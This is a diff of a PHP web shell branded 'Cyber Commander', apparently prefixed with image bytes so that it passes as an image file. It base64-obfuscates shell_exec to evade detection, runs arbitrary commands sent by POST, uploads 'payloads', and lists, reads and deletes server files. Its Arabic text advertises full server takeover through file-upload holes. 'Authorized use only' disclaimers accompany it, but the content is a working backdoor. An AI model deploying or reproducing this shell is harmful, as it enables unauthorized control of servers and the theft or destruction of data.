@@ -33,16 +33,15 @@ Fi²ÓÕYÅ×7rz{ÙÌí9YI&`IT vn>õ;¬ð™%š.ˆNiiêníóG¨Q: 3ÕÆu
 /**
  * SCRIPT NAME: ROOM TECH - CYBER COMMANDER V1
  * DEVELOPED BY: Room Tech Solutions (https://roomtech.cloud/)
- * * DISCLAIMER: This tool is for authorized security auditing only.
  */
 
-// 1. بدء حجز المخرجات لمسح أي محتوى غريب (مثل رموز الصور التي ظهرت لك)
+// 1. نظام التنظيف لمسح أي رموز صور أو محتوى سابق
 ob_start();
 
 error_reporting(0);
 @ini_set('display_errors', 0);
 
-// دالة فك التشفير للتمويه وتخطي الفحص التلقائي
+// التعمية لتخطي أنظمة الحماية
 function _rt_call($e) { return base64_decode($e); }
 $sx = _rt_call("c2hlbGxfZXhlYw==");       
 $fg = _rt_call("ZmlsZV9nZXRfY29udGVudHM="); 
@@ -59,7 +58,6 @@ chdir($currentDirectory);
 $viewResult = '';
 $imgPreview = '';
 
-// معالجة الأوامر والملفات
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (!empty($_POST['cmd_input'])) {
         $viewResult = $sx($_POST['cmd_input'] . " 2>&1");
@@ -84,63 +82,55 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-// 2. مسح أي مخرجات سابقة (الرموز الغريبة) قبل البدء بعرض HTML
 ob_clean(); 
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>ROOM TECH | CYBER COMMANDER</title>
+    <title>CYBER COMMANDER | ROOM TECH</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@600;900&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { --main-red: #ff0000; --bg: #030303; --panel: #0d0d0d; --green: #00ff41; }
         
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #e0e0e0; font-family: 'Fira Code', monospace; }
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #e0e0e0; font-family: 'Fira Code', 'Cairo', monospace; }
         
-        /* الحاوية الرئيسية الثابتة */
         .app-shell { display: flex; flex-direction: column; height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 9999; }
 
-        /* الهيدر الثابت */
-        header { background: #000; padding: 12px 25px; border-bottom: 2px solid var(--main-red); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; box-shadow: 0 5px 15px rgba(255,0,0,0.2); }
-        .logo { font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 18px; letter-spacing: 1px; }
+        header { background: #000; padding: 12px 25px; border-bottom: 2px solid var(--main-red); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+        .logo { font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 18px; }
         .logo span { color: var(--main-red); }
 
-        .body-layout { display: grid; grid-template-columns: 280px 1fr; flex-grow: 1; overflow: hidden; }
+        .body-layout { display: grid; grid-template-columns: 320px 1fr; flex-grow: 1; overflow: hidden; }
 
-        /* السايدبار الثابت */
-        aside { background: var(--panel); border-right: 1px solid #222; padding: 20px; overflow-y: auto; }
-        .side-tag { color: var(--main-red); font-size: 10px; text-transform: uppercase; margin: 15px 0 8px; border-bottom: 1px solid #222; padding-bottom: 3px; }
-        .btn-side { background: #111; border: 1px solid #333; color: #888; width: 100%; padding: 10px; text-align: left; margin-bottom: 6px; font-size: 11px; cursor: pointer; transition: 0.2s; }
+        /* Sidebar المحدث */
+        aside { background: var(--panel); border-right: 1px solid #222; padding: 20px; overflow-y: auto; scrollbar-width: none; }
+        aside::-webkit-scrollbar { display: none; }
+        
+        .side-tag { color: var(--main-red); font-size: 10px; text-transform: uppercase; margin: 20px 0 10px; border-bottom: 1px solid #222; padding-bottom: 3px; letter-spacing: 1px; }
+        .btn-side { background: #111; border: 1px solid #333; color: #888; width: 100%; padding: 10px; text-align: left; margin-bottom: 6px; font-size: 11px; cursor: pointer; }
         .btn-side:hover { background: var(--main-red); color: #fff; }
 
-        /* منطقة المحتوى القابلة للتمرير */
-        main { background: radial-gradient(circle at center, #150505 0%, #030303 100%); padding: 25px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: var(--main-red) #000; }
-        main::-webkit-scrollbar { width: 5px; }
-        main::-webkit-scrollbar-thumb { background: var(--main-red); }
+        /* نصوص الشرح وإخلاء المسؤولية */
+        .info-box { background: #000; border: 1px solid #1a1a1a; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
+        .info-box h5 { color: var(--main-red); margin: 0 0 5px 0; font-size: 11px; font-family: 'Orbitron'; }
+        .info-box p { font-size: 10px; color: #777; line-height: 1.5; margin: 0; text-align: justify; }
 
-        /* منطقة الصورة (تختفي إذا لم يوجد محتوى) */
+        /* Content Area */
+        main { background: radial-gradient(circle at center, #150505 0%, #030303 100%); padding: 25px; overflow-y: auto; }
         .rt-img-frame { background: #000; border: 1px solid var(--main-red); padding: 10px; margin-bottom: 20px; text-align: center; position: relative; }
-        .rt-img-frame img { max-width: 100%; max-height: 400px; border: 1px solid #222; }
-        .rt-img-frame span { position: absolute; top: 5px; right: 10px; color: var(--main-red); cursor: pointer; font-size: 12px; font-weight: bold; }
+        .rt-img-frame img { max-width: 100%; max-height: 400px; }
+        .rt-img-frame span { position: absolute; top: 5px; right: 10px; color: var(--main-red); cursor: pointer; font-size: 12px; }
 
-        /* الجدول والترمينال */
-        .path-bar { background: #000; padding: 10px; border-left: 4px solid var(--main-red); margin-bottom: 20px; font-size: 12px; }
-        .path-bar a { color: var(--main-red); text-decoration: none; font-weight: bold; }
-        .terminal { background: #000; border: 1px solid #222; margin-bottom: 20px; border-radius: 4px; overflow: hidden; }
-        .term-out { width: 100%; height: 220px; background: transparent; color: var(--green); padding: 12px; border: none; font-family: 'Fira Code'; resize: vertical; outline: none; }
+        .path-bar { background: #000; padding: 10px; border-left: 4px solid var(--main-red); margin-bottom: 20px; font-size: 11px; }
+        .terminal { background: #000; border: 1px solid #222; margin-bottom: 20px; }
+        .term-out { width: 100%; height: 200px; background: transparent; color: var(--green); padding: 12px; border: none; font-family: 'Fira Code'; resize: none; outline: none; }
         
-        table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.4); font-size: 13px; }
-        th { background: #500; color: #fff; padding: 12px; text-align: left; }
-        td { padding: 10px; border-bottom: 1px solid #1a1a1a; }
-        tr:hover { background: rgba(255,0,0,0.05); }
-
-        .f-btn { border: none; padding: 4px 10px; color: #fff; border-radius: 2px; cursor: pointer; font-size: 11px; }
-
-        footer { margin-top: 50px; padding: 30px; border-top: 1px solid #222; text-align: center; }
-        .footer-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; text-align: left; margin-bottom: 20px; }
-        .legal-txt { font-size: 11px; color: #555; line-height: 1.6; }
+        table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.4); font-size: 12px; }
+        th { background: #500; color: #fff; padding: 10px; text-align: left; }
+        td { padding: 8px 10px; border-bottom: 1px solid #1a1a1a; }
+        .f-btn { border: none; padding: 3px 7px; color: #fff; cursor: pointer; margin-right: 3px; }
     </style>
 </head>
 <body>
@@ -148,27 +138,43 @@ ob_clean();
 <div class="app-shell">
     <header>
         <div class="logo">ROOM TECH // <span>CYBER COMMANDER</span></div>
-        <div style="font-size: 11px; color: #444;">IP: <?=$_SERVER['SERVER_ADDR']?> | USER: <?=get_current_user()?></div>
+        <div style="font-size: 10px; color: #444;">SECURITY AUDIT INTERFACE</div>
     </header>
 
     <div class="body-layout">
         <aside>
-            <div class="side-tag">System Tools</div>
+            <div class="side-tag">System Control</div>
             <form method="post">
-                <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-fingerprint"></i> Check Permissions</button>
-                <button name="cmd_input" value="uname -a" class="btn-side"><i class="fas fa-microchip"></i> Kernel Info</button>
-                <button name="cmd_input" value="ls -la" class="btn-side"><i class="fas fa-list"></i> List Files</button>
+                <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-id-badge"></i> Check Auth</button>
+                <button name="cmd_input" value="uname -a" class="btn-side"><i class="fas fa-server"></i> Kernel Audit</button>
             </form>
 
-            <div class="side-tag">Server Upload</div>
+            <div class="side-tag">Payload Upload</div>
             <form method="post" enctype="multipart/form-data">
-                <input type="file" name="fileToUpload" style="font-size:10px; color:#555; margin-bottom:10px;">
-                <button class="btn-side" style="background:var(--main-red); color:#fff; text-align:center;">UPLOAD NOW</button>
+                <input type="file" name="fileToUpload" style="font-size:10px; color:#555; margin-bottom:10px; width:100%;">
+                <button class="btn-side" style="background:var(--main-red); color:#fff; text-align:center;">UPLOAD PAYLOAD</button>
             </form>
 
-            <div style="margin-top:40px; font-size:10px; color:#333;">
-                Developed by:<br>
-                <a href="https://roomtech.cloud/" style="color:#666;">Room Tech Solutions</a>
+            <div class="side-tag">Script Description</div>
+            <div class="info-box">
+                <h5>Web Penetration Tool</h5>
+                <p>هذا السكربت مصمم خصيصاً لاختبار اختراق المواقع، حيث يتيح للمختبر السيطرة الكاملة على السيرفر عبر استغلال ثغرات رفع الملفات (File Upload) وتحويل ملفات PHP إلى صيغ صور وهمية لتخطي الفلاتر الأمنية.</p>
+            </div>
+
+            <div class="side-tag">Terms of Use</div>
+            <div class="info-box">
+                <h5>Authorized Use Only</h5>
+                <p>يُحظر استخدام هذا السكربت إلا في بيئات اختبار قانونية ومصرح بها. استخدامه على سيرفرات دون إذن مسبق يعتبر جريمة إلكترونية يعاقب عليها القانون.</p>
+            </div>
+
+            <div class="side-tag">Disclaimer</div>
+            <div class="info-box">
+                <h5>No Responsibility</h5>
+                <p>المطور (Room Tech Solutions) يخلي مسؤوليته التامة عن أي سوء استخدام أو أضرار قد تنتج عن استخدام هذا السكربت في أنشطة غير قانونية أو عمليات اختراق غير مصرح بها. المستخدم هو المسؤول الوحيد عن أفعاله.</p>
+            </div>
+
+            <div style="text-align:center; padding:10px;">
+                <a href="https://roomtech.cloud/" style="font-size:10px; color:#333; text-decoration:none;">&copy; 2026 Room Tech Solutions</a>
             </div>
         </aside>
 
@@ -176,24 +182,24 @@ ob_clean();
             <?php if(!empty($imgPreview)) echo $imgPreview; ?>
 
             <div class="path-bar">
-                <i class="fas fa-folder-open"></i> WORKING_DIR: 
+                <i class="fas fa-terminal"></i> PATH: 
                 <?php
                 $parts = explode(DIRECTORY_SEPARATOR, $currentDirectory);
                 $cum = '';
                 foreach ($parts as $p) {
                     if ($p === "") continue;
                     $cum .= DIRECTORY_SEPARATOR . $p;
-                    echo ' / <a href="?d='.x($cum).'">'.$p.'</a>';
+                    echo ' / <a href="?d='.x($cum).'" style="color:var(--main-red); text-decoration:none;">'.$p.'</a>';
                 }
                 ?>
             </div>
 
             <div class="terminal">
                 <form method="post">
-                    <textarea class="term-out" placeholder="System output..."><?=htmlspecialchars($viewResult)?></textarea>
-                    <div style="background:#111; padding:10px; display:flex; gap:10px;">
-                        <input type="text" name="cmd_input" placeholder="Enter Bash Command..." style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:8px;">
-                        <button style="background:var(--main-red); color:#fff; border:none; padding:0 20px; font-weight:bold; cursor:pointer;">RUN</button>
+                    <textarea class="term-out" placeholder="Execution output..."><?=htmlspecialchars($viewResult)?></textarea>
+                    <div style="background:#111; padding:8px; display:flex; gap:10px;">
+                        <input type="text" name="cmd_input" placeholder="Execute Command..." style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:6px;">
+                        <button style="background:var(--main-red); color:#fff; border:none; padding:0 15px; font-weight:bold; cursor:pointer;">RUN</button>
                     </div>
                 </form>
             </div>
@@ -213,40 +219,20 @@ ob_clean();
                         if($v == "." || $v == "..") continue;
                         $u = $currentDirectory . '/' . $v;
                         $isD = is_dir($u);
-                        $ext = pathinfo($v, PATHINFO_EXTENSION);
                     ?>
                     <tr>
-                        <td><i class="fas <?=$isD?'fa-folder':'fa-file-code'?>" style="color:<?=$isD?'#f1c40f':'#888'?>; margin-right:8px;"></i> 
-                            <a href="<?=$isD?'?d='.x($u):'#'?>" style="color:#fff; text-decoration:none;"><?=$v?></a></td>
-                        <td style="color:#555;"><?=$isD?'--':round(filesize($u)/1024, 2).' KB'?></td>
+                        <td><i class="fas <?=$isD?'fa-folder':'fa-file-alt'?>" style="color:<?=$isD?'#fb0':'#888'?>; margin-right:8px;"></i> 
+                            <a href="<?=$isD?'?d='.x($u):'#'?>" style="color:#fff; text-decoration:none; font-size:11px;"><?=$v?></a></td>
+                        <td style="color:#555;"><?= $isD ? '--' : round(filesize($u)/1024, 1).'KB' ?></td>
                         <td style="color:<?=is_writable($u)?'#0f0':'#f00'?>"><?=substr(sprintf('%o', fileperms($u)), -4)?></td>
-                        <td style="display:flex; gap:5px;">
+                        <td style="display:flex;">
                             <form method="post"><input type="hidden" name="view_f" value="<?=$v?>"><button class="f-btn" style="background:#005cbf;"><i class="fa fa-edit"></i></button></form>
-                            <?php if(in_array($ext, ['jpg','png','jpeg','gif'])): ?>
-                                <form method="post"><input type="hidden" name="view_i" value="<?=$v?>"><button class="f-btn" style="background:#e67e22;"><i class="fa fa-image"></i></button></form>
-                            <?php endif; ?>
-                            <form method="post" onsubmit="return confirm('Delete this?')"><input type="hidden" name="del_f" value="<?=$v?>"><button class="f-btn" style="background:#dc3545;"><i class="fa fa-trash"></i></button></form>
+                            <form method="post"><input type="hidden" name="del_f" value="<?=$v?>"><button class="f-btn" style="background:#dc3545;"><i class="fa fa-trash"></i></button></form>
                         </td>
                     </tr>
                     <?php } ?>
                 </tbody>
             </table>
-
-            <footer>
-                <div class="footer-grid">
-                    <div class="legal-txt">
-                        <strong>Terms of Use:</strong><br>
-                        This script is provided by Room Tech Solutions for authorized auditing. Unauthorized use is strictly prohibited.
-                    </div>
-                    <div class="legal-txt">
-                        <strong>Disclaimer:</strong><br>
-                        الشركة غير مسؤولة عن أي استخدام خاطئ لهذا السكربت. الاستخدام على مسؤولية المستخدم الكاملة.
-                    </div>
-                </div>
-                <div style="font-size:10px; color:#222;">
-                    &copy; 2026 ROOM TECH SOLUTIONS - <a href="https://roomtech.cloud/" style="color:#333;">OFFICIAL WEBSITE</a>
-                </div>
-            </footer>
         </main>
     </div>
 </div>
